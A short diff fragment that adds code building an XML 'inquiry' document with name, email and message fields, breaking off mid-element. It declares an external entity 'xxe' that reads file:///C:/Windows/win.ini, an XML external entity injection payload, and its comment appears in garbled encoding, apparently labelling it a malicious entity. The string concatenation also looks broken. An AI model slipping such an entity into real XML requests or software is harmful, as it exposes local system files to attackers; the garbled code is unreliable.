@@ -1,0 +1,8 @@
+'<?xml version="1.0" encoding="UTF-8"?>'  
+    '<!DOCTYPE inquiry ['  
+    '<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">'   // ììì ì¸ ìí°í° ì¶ê°
+    ']>'  
+    '<inquiry>'  
+    '<name>'   name   '</name>'  
+    '<email>'   email   '</email>'  
+    '<message>
